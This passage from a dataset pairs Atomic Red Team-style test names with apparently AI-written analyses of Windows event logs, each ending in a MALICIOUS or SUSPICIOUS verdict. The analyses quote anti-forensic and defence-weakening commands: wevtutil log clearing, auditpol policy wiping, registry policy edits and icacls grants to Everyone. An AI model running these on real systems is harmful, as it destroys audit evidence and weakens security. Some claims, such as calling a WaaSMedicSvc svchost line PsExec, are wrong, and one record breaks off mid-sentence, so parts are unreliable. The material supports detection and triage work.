   - EventID 1102 indicates that the 'Security' log was cleared by `admin_test`. Clearing security logs is a significant red flag as attackers often do this to cover their tracks.
   - EventID 4616 shows a system time change, a classic tactic employed by attackers to backdate system logs and further complicate incident response and forensic timelines.

3. **System Log Analysis:**
   - EventID 104 reveals the clearing of both 'System' and 'Windows PowerShell' logs by `admin_test`.

4. **Execution of Suspicious Commands:**
   - The command `cmd.exe` executing a registry modification (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f`) appears. This may be making security-related changes, which could either be legitimate administrative action or malicious configuration intended to alter system behavior.

5. **Identity and Reconnaissance Commands:**
   - Invocations of commands like `whoami.exe` and `hostname.exe` are seen, which may be part of initial reconnaissance activities by an attacker.

6. **User:** 
   - All suspicious activities are associated with the user `SERVER002\admin_test`.

**Assessment and Conclusion:**

- **Clearing of multiple logs (System, Security, and Application)** is a strong indicator of malicious activity. This action seeks to erase traces of potentially harmful actions conducted on the system.
- **Suspicious command executions and registry modifications** without clear administrative consent or context further escalate the concern.
- **System time changes** recorded, possibly to aid in the obfuscation of unauthorized activities.

Given these observations, this activity appears coordinated to achieve stealth, indicating post-compromise actions typical of a threat actor hiding their presence on the compromised host. 

**Resolution:** MALICIOUS

**Recommended Actions:**
1. Immediately isolate the system `Server002` to prevent further unauthorized access or data exfiltration.
2. Initiate a full forensic investigation to identify entry vectors, lateral movement within the network, and potential data compromised.
3. Review and enhance log policy settings to ensure retained log integrity and improve monitoring/alerting infrastructure to detect such activities earlier.
4. Consider implementing tighter access controls and privileged access management (PAM) to prevent unauthorized use of tools like `wevtutil.exe` and registry modifications.
5. Coordinate with internal incident response teams and potentially engage external cybersecurity experts to assist with remediation and recovery efforts. 

Prompt attention and action are necessary to contain and mitigate this security incident."
Create ADS command prompt,"**Analysis of the Windows Event Logs:**

Upon analyzing the provided event logs, several points of interest stand out, indicating potentially suspicious activity:

### **1. Log Clearance:**
- **EventID 104** and **EventID 1102** indicate that the event logs have been cleared. These actions were performed by the user `admin_test` across different channels: System, Windows PowerShell, and Security. This behavior is often synonymous with malicious activity where an adversary attempts to cover their tracks.

### **2. Use of `wevtutil`:**
- The presence of **Sysmon EventID 1** logs with the execution of `wevtutil.exe` with the `cl` argument (clear logs) confirms the log clearance. This aligns with the event log clearance noted earlier.
  
### **3. Privileged Activities:**
- **EventID 4672** logs show `admin_test` using special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others. While this may be a part of normal administrative tasks, combined with log clearance, it deserves additional scrutiny to ensure these privileges weren’t misused.
  
### **4. Time Changes:**
- **EventID 4616** indicates a change in the system time, which is a technique sometimes used by adversaries to mislead logs and timestamps.

### **5. Unusual Command Execution:**
- The **Sysmon log** shows the execution of `cmd.exe` with commands involving alternate data streams (specifically `T1564.004_has_ads_cmd.txt:adstest.txt`). This is a known technique used for hiding files or executing scripts. It raises red flags, particularly in the context of cleaning log files and privilege escalation.

### **6. Normal Operations:**
- Some entries, such as the operations involving `Microsoft Edge Update` and system processes like `TrustedInstaller.exe`, appear normal and align with expected system maintenance activities. However, due to the suspicious activities mentioned, a thorough check of all active processes would be warranted.

### **Assessment:**
The logs present indicators of potential compromise, including the clearing of logs, the execution of suspicious command-line actions with `wevtutil`, and the use of high privilege actions. While some activities could be attributed to legitimate administrative work, the combination and context suggest a risk of unauthorized or malicious activity.

### **Resolution: SUSPICIOUS**

**Recommendations:**
1. **Immediate Attention:** Conduct a thorough forensic analysis of the `Server002` system. Look for any unauthorized changes, particularly focusing on persistence mechanisms or scheduled tasks that might indicate backdoor activities.
   
2. **Audit User Activity:** Review the actions and logs associated with the `admin_test` account to ascertain whether these actions were authorized and in context with the user's role.
   
3. **Network Monitoring:** Enable enhanced logging and monitoring on your network, particularly for command-line execution and privilege escalation activities.
   
4. **File Integrity Check:** Execute checks on critical system files and configurations to ensure no tampering has occurred.

5. **User Education and Verification:** Verify current administrative policies are upheld and provide training if needed.

Addressing these recommendations can help mitigate any potential damage and prevent future incidents."
Hidden Window-Conhost Execution,"### Analysis of Windows Event Logs

#### Sysmon Log Analysis
1. **Suspicious PowerShell Execution:**
   - An instance of `powershell.exe` is executed with the command line `""powershell.exe"" & {conhost.exe --headless calc.exe}`. This action is notably suspicious because it suggests an obfuscation technique often used to bypass defenses, albeit executing a non-malicious application (`calc.exe` is typically benign). PowerShell's use to execute another process in a headless manner raises a red flag for code execution without a user interface.

2. **Clearing of Event Logs:**
   - Multiple uses of `wevtutil.exe` were logged; this tool is responsible for clearing event logs. The specific command line used (`""wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, `""wevtutil.exe"" cl Application`, `""wevtutil.exe"" cl System`, `""wevtutil.exe"" cl Security`, `""wevtutil.exe"" cl ""Windows PowerShell""`) indicates an attempt to clear various logs. This activity is a major red flag, often seen in attacks where adversaries attempt to hide their footprints.

#### System Log Analysis
1. **Log Clearing Event:**
   - Events are noted where an account (`admin_test`) cleared logs such as the System and Windows PowerShell logs (`EventID: 104`). This reinforces the Sysmon findings and further suggests potentially malicious activity, especially since it's done shortly after possibly malicious PowerShell commands.

2. **Time Change:**
   - There are a series of time adjustments noted (`EventID: 1 and 24`) involving `svchost.exe`. While this may be benign, time changes can sometimes be used to manipulate timestamps for logs, confusing forensic analysts.

#### PowerShell Log Analysis
1. **PowerShell Session Initiated:**
   - The presence of a PowerShell script starting with `conhost.exe --headless calc.exe` is unusual, and the log indicates that PowerShell was used in a manner that aligns with known evasion tactics (EventID: 600, 400).

#### Security Log Analysis
1. **Security Log Cleared:**
   - The security log being cleared (`EventID: 1102`) is highly suspicious and aligns with an attempt to cover up activities performed by a user account (`admin_test`).

### Threat Assessment
- **Indicators of Possible Intrusion:**
  - Use of PowerShell with obfuscated or unconventional command-lines.
  - Consistent clearing of critical event logs, including system, security, and application logs.
  - Execution of Sysinternals and System utility tools (`wevtutil.exe`) to cover tracks.
  
### Conclusion and Resolution
The events logged suggest an orchestrated effort to execute potentially malicious commands in a stealthy manner and subsequently cover tracks by erasing evidence of these activities within event logs. The combination of PowerShell misuse and event log clearance is a tactic often associated with malicious actors attempting to perform post-exploitation activities while avoiding detection.

**Resolution: MALICIOUS**

### Recommendations for Proceeding
1. **Expedited Response:**
   - Review and secure the `admin_test` account immediately to prevent unauthorized access.
   - Initiate a full forensic analysis of `Server002` for any additional signs of compromise.
   - Consider reimaging affected systems to ensure complete root cause eradication.

2. **Enhance Monitoring and Logging:**
   - Implement more granular logging and alerting for changes in system time, PowerShell script execution, and log clear commands.
   - Investigate setting up Advanced Threat Detection and Response systems to help catch such activities earlier.

3. **Security Training and Awareness:**
   - Conduct staff training on the significance of security event log monitoring and how to recognize potentially malicious insider activities."
NetWire RAT Registry Key Creation,"After analyzing the provided event logs, several indications of suspicious and potentially malicious activities have been identified. Here is a detailed analysis:

1. **Event Log Clearance**:
   - There are multiple instances of the event log being cleared, particularly relevant events from security, system, and PowerShell logs. This is a significant red flag for malicious activity, as clearing logs can be an attempt to cover up traces of an attack.

2. **Use of Scheduled Tasks and Registry Modifications**:
   - There are several events involving the command `cmd.exe` executing registry commands under the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key. This is a common persistence technique used by malware to ensure execution upon user logon.

3. **Unusual Process Activities**:
   - The execution of `whoami.exe` is seen multiple times. While not inherently malicious, this command can be used by attackers to gather information about the privileges of the currently logged-in user. 
   - The use of `wevtutil.exe` to clear logs is suspicious because it is directly related to the clearing of relevant logs mentioned earlier.

4. **Time Discrepancy**:
   - The logs show time changes (Event ID 4616 in Security log) by `svchost.exe`, which could be indicative of time manipulation, a technique sometimes used to disrupt forensic analysis or scheduled tasks.

5. **Presence of Known Malicious Indicators**:
   - Several commands executed by `cmd.exe` suggest the installation or configuration of software typically associated with NetWire RAT, a known remote access trojan. This presence is evident in the registry activity trying to enter values under the NetWire key.

Based on the analysis, these activities strongly suggest the presence of malicious activities aimed at gaining persistence, covering tracks by clearing logs, and possibly deploying or configuring a remote access tool. 

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected system to prevent further lateral movement and data exfiltration.
- Conduct a full memory and disk forensic analysis to recover any deleted or cleared logs and determine the extent of the breach.
- Review and enhance endpoint protection mechanisms and regularly audit security controls to detect similar threats in the future.
- Evaluate the need to involve law enforcement, especially if sensitive data is compromised.
- Inform potentially affected users and reset credentials to mitigate unauthorized access.

This response addresses the observed suspicious activities and aligns with standard incident response protocols to deal with such threats."
Disable Microsoft Office Security Features,"### Detailed Analysis of the Logs

**1. Indicators of Suspicious Behavior:**
   - **Use of `wevtutil.exe`**: Multiple instances of the process `wevtutil.exe` are invoked with the command-line argument `cl` (clear log) targeting various logs such as Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell logs. This process is executed by `admin_test`. The frequent and repeated clearing of event logs, especially involving security logs, is not typical in regular system operations and can often indicate an attempt to cover malicious activity.
   - **PowerShell Activity**: There is suspicious PowerShell activity. PowerShell is executing scripts that modify the registry keys under the Office Excel Security settings. Such modifications could potentially be used to weaken security settings or to leverage for further malicious activities.
   - **Log File Clearing**: The logs show that system logs, including security and PowerShell logs, have been cleared by `admin_test`. The Event ID 104 and Event ID 1102 indicate log clearing, which is generally not a routine task and is considered highly suspicious, especially when combined with the other activities observed.

**2. Possible Malicious Indicators:**
   - **Privilege Escalation**: The execution of `PowerShell` under `admin_test` with a high integrity level and low visibility (clearing logs) could be indicative of attempts to escalate privileges or execute scripts with elevated permissions without leaving traces.
   - **Use of PsExec (`svchost.exe -k wusvcs -p -s WaaSMedicSvc`)**: The appearance of PsExec or a similarly leveraged service to execute commands remotely can be a sign of lateral movement or persistence establishment.
   - **Registry Changes**: The modification of registry settings related to Excel and disabling of certain protected views can potentially expose the system to further exploits through Office documents.

### Assessment of the Situation

The examined logs highlight multiple red flags pointing towards **malicious intent**:
- Frequent clearing of different logs suggests attempts to obfuscate actions and remove traces of activity.
- The PowerShell script executed implies potential security policy bypassing or setting the stage for a larger compromise.
- No indications of routine maintenance that would justify the log clearing and registry manipulations were observed.

### Final Resolution

**Resolution: MALICIOUS**

### Recommended Actions

To mitigate and further analyze this situation, consider the following actions:
1. **Isolate and Monitor**: Immediately isolate the involved host (Server002) from the network to prevent potential lateral movement.
2. **Conduct a Full System Audit**: Utilize forensic tools to recover and analyze any remnants of activity that may have been attempted to be hidden by log clearing actions.
3. **Reset Credentials**: Since the account `admin_test` shows suspicious activity, reset credentials of this account and monitor for any unauthorized access attempts.
4. **Strictly Review Group Policies**: Ensure the current group's policies are up-to-date and restrict the usage of command line utilities like PowerShell and `wevtutil.exe` to trusted personnel only.
5. **Increase Alerting and Monitoring**: Implement additional logging and monitoring using SIEM solutions to detect similar activities in future.
6. **Patch and Update Systems**: Ensure that all systems, particularly Office-related applications, are patched and comply with the latest security standards."
Malware Masquerading and Execution from Zip File,"Based on the analysis of the provided logs, several events indicate the potential for malicious activity on the monitored host, Server002. The following points summarize the findings:

1. **PowerShell Activity**:
   - Multiple PowerShell scripts were executed within a short time frame. These scripts involved expanding an archive (`Expand-Archive`) and executing a batch file (`cmd /c README.cmd`). Such activities are common for non-malicious script execution but are also consistent with preparation steps for certain types of malware deployment or execution of post-exploitation frameworks such as Atomic Red Team, which is known for security testing and simulating cyber threats.

2. **Event Log Clearing**:
   - There were events recorded indicating the clearing of various system logs (event IDs 1102 in Security logs and 104 across various channels in System logs) using `wevtutil.exe`. This behavior is highly suspicious as threat actors often attempt to delete logs to cover their tracks post-compromise.

3. **Privilege Escalation**:
   - The logs show privilege assigned events (event ID 4672) for the `admin_test` user, indicating elevated privileges. The operator has multiple high-level privileges typically associated with system or domain administration duties (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege).

4. **Suspicious DLL Load**:
   - The execution of `rundll32.exe` to start a DLL (`2.dll, StartW`) via `cmd.exe`, often a tactic seen in malware to execute malicious DLLs.

5. **Use of Potentially Dangerous Commands**:
   - Use of command-line utilities and commands, such as `whoami.exe` and `hostname.exe`, are typical reconnaissance steps taken post-compromise to understand the context of the compromised environment.

6. **Edge Update and Installation**:
   - Numerous processes related to Microsoft Edge updates and installations were observed. While these could be benign if updates were ongoing, the presence of installers and temp setup files executed in a somewhat coordinated fashion could benefit further verification.

In summary, while some activities could explain a legitimate system administration or software update context, the combination of event log clearing alongside other noted suspicious behaviors strongly suggests that these activities warrant further investigation.

Resolution: **SUSPICIOUS**

### Guidance on How to Proceed
- **User Verification**: Verify the legitimacy of the `admin_test` account and check if the activities align with expected system administration tasks.
- **Artifact Collection**: Gather memory dumps and other volatile data to analyze any potentially malicious processes actively running.
- **Investigate File System Changes**: Review changes in the filesystem, especially focusing on directories involved in the suspicious PowerShell commands and any unexpected DLLs (e.g., `2.dll`).
- **Network Traffic**: Inspect network logs for any unusual outbound connections around the time of the logs.
- **Scripting and Automation**: Consider implementing tighter controls around the execution of PowerShell and command-line scripts.
- **Security Controls**: Ensure that Windows Defender and other security solutions are up-to-date with the latest definitions, and enforce strict policy on event log tampering."
Clear Windows Audit Policy Config,"Based on the analysis of the provided logs, the following suspicious and potentially malicious activities are noted:

1. **Log File Clearance**: Multiple events (Event ID 104 in the System log and Event ID 1102 in the Security log) indicate that log files (System, Windows PowerShell, Security) have been cleared. The clearing was performed by the user `admin_test`. Clearing event logs is highly suspicious as it may indicate an attempt to hide malicious activity, especially when multiple logs are cleared in quick succession.

2. **Privilege Escalation and High-Privilege Usage**: The logs show several instances of privileges being assigned to the user `admin_test` (Event ID 4672 in the Security log). The privileges include `SeSecurityPrivilege`, `SeBackupPrivilege`, and others commonly used in attacks (e.g., `SeDebugPrivilege`). This, combined with the cleared logs, raises red flags about the user's intentions.

3. **Time Manipulation**: There are instances of Event ID 4616, where the system time is modified. Such activities can be indicative of attempts to manipulate logs or timestamps to cover unauthorized actions.

4. **Audit Policy Manipulations**: The `auditpol` commands (`auditpol /clear /y & auditpol /remove /allusers`) were executed, as observed in the Sysmon logs. This action effectively disables logging/auditing policies which is a common tactic used to prevent security tools from recording potentially malicious activity.

5. **Command-Line Executions**: Use of command-line utilities such as `wevtutil`, `auditpol`, and `cmd.exe` in a sequence that aligns with clearing logs and manipulating audit policies is common in attackers attempting to cover their tracks post-compromise.

6. **Lateral Movement or Anomalous Logons**: The presence of NTLM authentication and the use of network addresses like `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102` indicates potential lateral movement or unauthorized network logins from atypical addresses or methods (Event ID 4624).

### Assessment and Resolution:
Given the evidence above, the activities clearly demonstrate behavior consistent with a malicious actor attempting to cover their tracks. The consecutive clearing of logs and disabling of audit policies are critical indicators. 

**Final Resolution:** MALICIOUS 

### Recommended Actions:
- Immediately isolate the host `Server002` to prevent further network spread.
- Conduct a full malware and forensic analysis of the host to determine the full extent of the compromise.
- Review access logs and credentials associated with the `admin_test` account to determine if they have been compromised.
- Reset passwords and access credentials potentially affected by this incident.
- Restore the system from a known good backup and ensure all patches and security updates are applied.
- Strengthen security policies, monitoring, and incident response procedures to detect and prevent similar incidents in the future."
Create and start VirtualBox virtual machine,"Upon reviewing the Windows event logs provided, several indicators suggest suspicious activities likely require further investigation:

1. **Security Log:**
   - **Event ID 1102** indicates that the security log was cleared by the user `admin_test`. Clearing event logs, especially the security log, is a classic indicator of an attempt to cover tracks after malicious activity.

2. **System Log:**
   - **Event ID 104** shows that both the System and Windows PowerShell logs were cleared by the same `admin_test` user. This event further suggests an effort to remove traces of potentially unauthorized or malicious actions.

3. **Sysmon Log:**
   - Multiple entries show the execution of `wevtutil.exe` with the `cl` (clear) command, targeting various logs (`Security`, `System`, `Windows PowerShell`) by the `admin_test` user. This corroborates the log clearing activity seen in the Security and System logs and suggests intentional use of `wevtutil.exe` for log manipulation:
     - Sysmon Event ID 1 entries reinforce the use of `wevtutil.exe` with the `cl` argument, matching the timings of the 1102 and 104 events.
   - **Execution of `cmd.exe`**: A command was executed to create and start a virtual machine named ""Atomic VM"" through VirtualBox, which could be used for testing, exploitation, or setting up an isolated environment potentially for malicious activities.
   - `powershell.exe` instances and other command executions (like `hostname.exe` and `whoami.exe`) correlate with what could be regular system administrations, but given the context, are suspicious as they temporally align with logs being cleared.

4. **Patterns Common Across All Logs:**
   - The user `admin_test` appears central to all actions that coincide with the clearing and subsequent suspicious command executions.
   - The logs show an almost systematic clearing, leaving a small window of time unaccounted where process execution (including VirtualBox manipulations and PowerShell activity) could have aligned with malicious behaviors.

**Threats/Risks Identified:**
- Potential cover-up: Log clearing is a common tactic post-compromise to erase evidential traces.
- Unauthorized Virtual Machine activity: Potentially for running malicious payloads cloaked from a standard antivirus.
- Elevated integrity and process privileges suggest potential privilege escalation exploits.

**Guidance on How to Proceed:**
- Conduct a thorough investigation to determine the legitimacy of the `admin_test` user's actions. Verify user intentions, audit permissions, and inspect any deviation from typical behavior.
- Analyze network activity logs for exfiltration or communication with known malicious IPs during the window of the suspicious activities.
- Perform a forensic analysis on the system, especially the virtual machine created, to identify any suspicious software or payloads.
- Quarantine the server and review any actively running scripts or services for potential threats.

**Final Resolution**: 
- **SUSPICIOUS**: The logs contain suspicious activities which need further investigation. The systematic log clearing, coupled with potentially unauthorized activities like virtual machine creation, strongly indicates potentially malicious behavior that must be verified and addressed promptly."
Activate Windows NoControlPanel Group Policy Feature,"The log analysis reveals several key points of interest that indicate potential malicious activity on the host:

### Suspicious or Anomalous Activities:
1. **Log Clearing Activity:**
   - Multiple instances of `wevtutil.exe` are utilized to clear event logs, specifically targeting the `System`, `Security`, `Windows PowerShell`, and `Sysmon` logs. This is generally considered highly suspicious as adversaries often clear logs to cover tracks post-exploitation.

2. **Registry Modification:**
   - The execution of `cmd.exe` includes a command to modify the Windows registry settings to add a policy (`NoControlPanel`) under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`. This action disables access to the Control Panel, which can be an indicator of an attempt to limit system administration functions to hide malicious activity.

3. **Process Execution:**
   - A sequence of processes starting with `cmd.exe` and leading to `reg.exe` further confirms registry modification activities. The parent processes suggest chain execution designed to make system changes.

### Indicators of Malicious Activity or Compromise:
- **User Context:** All actions are performed under the `SERVER002\admin_test` user account with high integrity level, implying administrative powers. If the `admin_test` account's activity is not expected at this time, they could be a potential entry point or tool for lateral movement.
- **Timing and Record ID Correlations:** The chronological order and close timing of log-clearing events suggest a planned execution rather than benign administrative tasks.
- **Usage of `wevtutil.exe` for Log Deletion:** This execution is a red flag in security monitoring, usually indicating an attempt to hide malicious activities by deleting traces.

### Assessment of the Situation:
The noted activities involve suspicious process executions and command lines usually linked with post-exploitation cleanup and persistence actions. The use of native Windows utilities (`wevtutil.exe`, `reg.exe`, etc.) is a common tactic in ""living off the land"" strategies by attackers.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **User Account Review:** Review recent activities linked to `admin_test` and determine if any unexpected login origins exist. Ensure the credentials haven't been compromised. Consider account password changes and increased monitoring.
  
2. **Endpoint Protection and EDR:** Ensure that endpoint detection and response systems are scanning for similar tactics and employ hunting queries to find similar or related indicators across other systems.
  
3. **Forensic Analysis:** Conduct a thorough forensic investigation of the system and network for additional indicators of compromise, lateral movement, and data exfiltration activities.
  
4. **System Integrity Checks:** Verify critical system files' integrity, and ensure no changes made unforeseen impacts on system operations.
  
5. **Restore from Backup:** Depending on the organization's protocol and risk assessment, restoring the system from a known clean backup could be considered as part of remediation."
BlackByte Ransomware Registry Changes - CMD,"Upon reviewing the provided logs, I have identified several events and sequences that could be indicative of anomalous or potentially malicious behavior. Here is a detailed breakdown of the findings:

### Suspicious Behavior:
1. **Use of `wevtutil`**:
   - The logs show multiple instances of `wevtutil.exe` being executed with the `cl` (clear log) command on various logs like `Application`, `System`, `Security`, and `Windows PowerShell` in a short time frame.
   - This activity, executed by `admin_test` on the `SERVER002`, appears suspicious as it involves clearing event logs, which is a common tactic used by attackers to cover their tracks.

2. **Registry Modifications via `cmd.exe`**:
   - The logs show executions of `cmd.exe` with multiple `reg add` commands in rapid succession. These modify policies under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`.
   - The modifications include `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`, which can potentially be exploited for privilege escalation or bypassing security mechanisms.

3. **Frequent Invocations of `conhost.exe`**:
   - Linked with every `whoami.exe` and `hostname.exe` invocation, `conhost.exe` is used to provide the console window host. However, the frequency and pattern of these calls seem unusual and could be indicative of script-based activity.

4. **Time Change Activity**:
   - Events show discrepancies around system time adjustments with processes `svchost.exe` influencing these changes. This can be part of a strategy to avoid detection or tamper with time-sensitive logs and tasks.

5. **Microsoft Edge Update Activity**:
   - While the `edgeupdate` entries could be normal, due to their timing with the other suspicious activities, they warrant attention to ensure they were legitimate updates and not used as cover for other operations.

### Indicators of Malicious Activity:
- The combination of event log clearing, registry modifications, and time change activities are strong indicators of malign intent, aimed at maintaining persistence, privilege escalation, or data integrity manipulation.
- These are consistent with techniques employed in post-exploitation stages of an attack (e.g., Timestomping, Log manipulation in MITRE ATT&CK framework).

### Assessment and Recommendations:
- **Resolution**: **MALICIOUS**
  - The activities logged suggest that a compromise may have occurred, possibly indicating an attempt to cover tracks and establish persistence.
- **Guidance**:
  1. **Immediate Isolation**: Consider isolating the host `SERVER002` from the network to prevent potential lateral movement.
  2. **Conduct Forensics**: Perform a thorough forensic investigation to determine the extent of the compromise and collect any additional evidence.
  3. **Audit Logs and Accounts**: Review other system logs and account activities, especially for `admin_test`, to uncover further indicators of compromise.
  4. **Review Policies**: Analyze the changes made to system policies and evaluate potential impacts on security measures.
  5. **Evaluate Edge Updates**: Verify whether the Microsoft Edge updates were indeed legitimate and investigate any unapproved software installations.

These steps will help in understanding the full scope of the incident and in implementing better protective measures going forward."
cacls - Grant permission to specified user or group recursively,"Upon reviewing the provided Windows event logs, several indicators of suspicious activity have been identified, along with a clear attempt to obfuscate actions and potentially cover tracks. Here is the detailed analysis:

1. **Event Logs Clearance**:
   - There are multiple entries in the logs indicating the use of `wevtutil.exe` to clear logs (`cl`) for various channels such as Security, System, Application, and Windows PowerShell. The logs involved are Event IDs 104 and 1102 indicating ""The event log was cleared"".
   - The tool used (`wevtutil.exe`) is a legitimate utility but frequently utilized by attackers to cover tracks by deleting event logs.

2. **Command Execution via cmd.exe**:
   - The Sysmon logs show the execution of several commands using `cmd.exe` with suspicious command lines:
     - Checks for specific files (`IF EXIST %%temp%%\\T1222.001_cacls`).
     - File creation and modification actions which may suggest preparation for privilege escalation or data manipulation.
     - Use of `icacls.exe` to alter file permissions (`/grant Everyone:F`), which can facilitate further exploitation by granting excessive permissions.

3. **Time Manipulation**:
   - Events around `TimeCreated` show actions with minimal intervals indicating automation such as scripts running.
   - Adjustments or manipulation of system time (`EventID 4616`) suggest possible attempts to evade detection or confuse log timestamps.

4. **Unusual Processes and Privilege Levels**:
   - Execution of `whoami.exe` and other reconnaissance commands is often used to determine the current user's access level and privileges.
   - Multiple processes are spawned under the `admin_test` user account, consistently at a `High` integrity level.

5. **Consistency in Activity Timing**:
   - The events occur within a very narrow time window, suggesting scripted or batch level execution, a behavior consistent with automated attack scripts.

Given these findings, the combination of log clearance, file permission changes, reconnaissance actions, and the use of tools like wevtutil, cmd.exe, and icacls alongside the narrow execution time window strongly suggest malicious intent or compromise. The logs demonstrate a sequence of actions that align with tactics, techniques, and procedures (TTPs) commonly associated with a malicious insider or an attacker with elevated privileges within the network.

**Resolution**: Malicious

**Recommendations**:
- Immediately inspect the `admin_test` account for unauthorized use or potential compromise.
- Check for any persistence mechanisms that might have been established due to the altered file permissions.
- Review network traffic for potential data exfiltration activities and apply restrictions if necessary.
- Conduct a full forensic analysis of the involved systems to understand the breadth of compromise, and ensure all incidents are reported according to company policy.
- Implement continuous monitoring and alerting on event log clear actions and suspicious command executions in the future."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"Based on the analysis of the provided Windows event logs, there are multiple indicators of potential malicious activity:

1. **Event Log Clearing**: 
   - The `Security`, `System`, and `Windows PowerShell` logs were cleared at almost the same timestamp (`EventID: 1102 in Security log, EventID: 104 in System log`).
   - These actions were performed by the user `admin_test`, which is suspicious as log clearing is a known method used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity**: 
   - PowerShell logs indicate the execution of a script related to `AtomicRedTeam` tests and usage of `InstallUtil`. The execution of scripts from the `TEMP` directory, specifically involving `InstallUtil`, can often be a technique used by attackers to bypass typical execution policies or defenses (T1218.004 - Signed Binary Proxy Execution: InstallUtil).

3. **Abnormal Process Execution**:
   - Processes like `wevtutil.exe` (used to clear logs) and the execution of `.NET` related compilers (`csc.exe` and `cvtres.exe`) from the PowerShell process suggest actions typical of post-exploitation activity.

4. **Concerning Use of InstallUtil**:
   - The use of `InstallUtil.exe` to run a .NET assembly from a temporary path (T1218.004.dll) indicates a likely use of this utility to execute unauthorized code.

5. **System Integrity and Behavior**:
   - Multiple executions of `wevtutil.exe` for clearing logs and the spawning of related processes such as `conhost.exe` show an abuse of system utilities to manipulate system state.

The combination of cleared logs, suspicious script execution directly related to known attack techniques, and use of administrative utilities to potentially execute unauthorized commands is indicative of malicious activity with a high level of confidence.

### Resolution: MALICIOUS

### Recommended Actions:
1. **Immediate Response**:
   - Isolate the affected host (Server002) from the network to prevent further lateral movement or exfiltration.
2. **Forensic Investigation**:
   - Capture volatile data from the system, including running processes, network connections, and any suspicious files in the `TEMP` directory.
3. **Incident Analysis**:
   - Investigate the origin of the `AtomicRedTeam` files and assess how they were executed with administrative privileges.
4. **Security Posture Assessment**:
   - Review and strengthen the security policies to prevent the misuse of administrative tools and execution of scripts from unauthorized directories.
5. **Report and Notify**:
   - Report the incident to the relevant internal teams for awareness and follow-up actions.

   - Rebuild the affected host from a trusted backup post-investigation, and monitor for any sign of recurrence across the environment. 

Taking these steps will help contain and mitigate the risk posed by the identified malicious activities."
Register-CimProvider - Execute evil dll,"Upon reviewing the provided logs, a sequence of events highlights potentially suspicious behavior involving administrative actions and event log manipulation on Server002. Here is a detailed analysis:

1. **Event Log Clearance:**
   - **Security Log (EventID 1102):** The security event logs were cleared by the user ""admin_test,"" as indicated by the event at `19:26:58`.
   - **System Log (EventID 104):** The system event logs were also cleared by the same user ""admin_test"" at the same timestamp.

2. **Sysmon Events:**
   - **Use of `wevtutil.exe`:** Immediately before and after the log clearance, multiple instances of `wevtutil.exe` (the Eventing Command Line Utility) were used to clear event logs across different channels including Security, Sysmon, Application, System, and Windows PowerShell. This set of actions is suspicious as `wevtutil` is frequently used in clearing event logs to cover up tracks.
   - **Integrity Level and User Context:** The processes were executed with high integrity and under the user context ""SERVER002\admin_test,"" indicating administrative privileges were utilized.
   - **PowerShell Usage:** A PowerShell process (`powershell.exe`) was initiated under the same admin user. Although no specific malicious command is provided, PowerShell is often involved in advanced threat actions.

3. **Commands and Execution Paths:**
   - **Command Lines:** The command lines for `wevtutil.exe` involve clearing specific event logs, suggesting an attempt to hide activities.

4. **Unusual Execution of **`Register-CimProvider.exe`**:
   - The command ""cmd.exe /c C:\Windows\SysWow64\Register-CimProvider.exe"" indicates execution of a script, possibly loaded with a DLL from ""AtomicRedTeam"" directory, which can signify an execution of a testing attack simulation or a real attack using known techniques (T1218 - System Binary Proxy Execution) used by adversaries.

5. **Microsoft Edge Update Activities:**
   - While multiple Microsoft Edge Update processes are seen, these seem consistent with legitimate software update activities, which might have coincidentally occurred during the same timeframe.

6. **Overall Pattern Analysis:**
   - The sequence of using administrative processes to clear logs before running potential scripts to hide activities strongly indicates an attempt to cover tracks, aligning with tactics used in malicious actions. The involvement of Windows-native binaries (`wevtutil`, `cmd.exe`) and the presence of potential test/attack files add to the suspicious context.

### Assessment:
**Resolution: MALICIOUS**

The combination of log clearing, command execution with administrative privileges, usage of utilities to potentially obfuscate activities, and anomalous command execution paths strongly suggests malicious activity indicative of an internal compromise or malicious testing activity on Server002. The presence of potential testing tools (such as Atomic Red Team tactics) can also represent a penetration test; however, without prior scheduling or authorization context, it poses a serious risk.

### Guidance:
- **Immediate Action:** Isolate the machine from the network to prevent further malicious activities.
- **Additional Investigation:** Perform a thorough forensic analysis of the machine for evidence of unauthorized access or modifications. Investigate the executed scripts for any payload or alteration of system settings.
- **Documentation:** Verify any documented penetration testing activities, if such are in place, to rule out authorized tests. Absence of such documentation mandates escalation to incident response.
- **Follow-Up:** Review and possibly reset credentials for ""admin_test"" and ensure that auditing and monitoring settings are appropriately configured across the network to prevent future occurrences."
Abusing MyComputer Disk Cleanup Path for Persistence,"### Analysis of Logs

#### Suspicious Activities Identified:
1. **Log File Clearing Events**: 
   - The `Security`, `System`, and `Windows PowerShell` logs were cleared around the same time by the user `admin_test` on `Server002`. The Event IDs (`1102`, `104`) in both `Security` and `System` logs indicate that logs have been cleared, which could potentially be an attempt to cover up malicious activities.

2. **Registry Modification**:
   - A command was executed using `cmd.exe` to modify the registry:

Disable Windows Remote Desktop Protocol,"The analysis of the provided Windows event logs reveals several key observations and findings that suggest potential issues related to system manipulation and suspicious activities:

1. **Time Tampering:**
   - There are multiple instances where the system time was adjusted (Event IDs 4616 from the Security Log, and Kernel-General EventIDs 1). Changing the system time without proper justification can be indicative of attempts to manipulate time-based logs or security mechanisms.

2. **Event Log Clearing:**
   - The logs indicate clearing of multiple log channels such as System, Security, and PowerShell logs by the `admin_test` user (Event IDs 104 in the System Log and 1102 in the Security Log). Log clearing can be a tactic used by malicious actors to cover their tracks.

3. **Command Execution:**
   - Execution of `cmd.exe` with a command to modify the Windows registry for disabling remote access (fDenyTSConnections) is notable (Sysmon EventID 1). Unauthorized changes to critical system settings may indicate malicious intent.
   
4. **Use of System Utilities:**
